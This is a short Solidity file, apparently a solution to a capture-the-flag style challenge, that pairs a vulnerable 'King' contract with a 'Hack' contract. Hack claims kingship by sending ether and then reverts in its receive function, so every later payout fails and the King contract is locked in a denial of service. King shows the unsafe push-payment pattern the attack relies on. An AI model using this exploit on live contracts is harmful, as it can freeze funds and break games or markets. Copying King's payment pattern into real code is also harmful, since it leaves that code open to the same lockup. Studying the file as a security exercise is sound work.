// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Hack{
    King target;
    
    constructor(address payable _target) payable {
        target = King(_target);
    }

    function playGame() external payable {
        (bool ok, )=address(target).call{value: msg.value}("");
        require(ok, "not ok");
    }
    
    receive() external payable { 
        revert();
    }
}

contract King {

  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}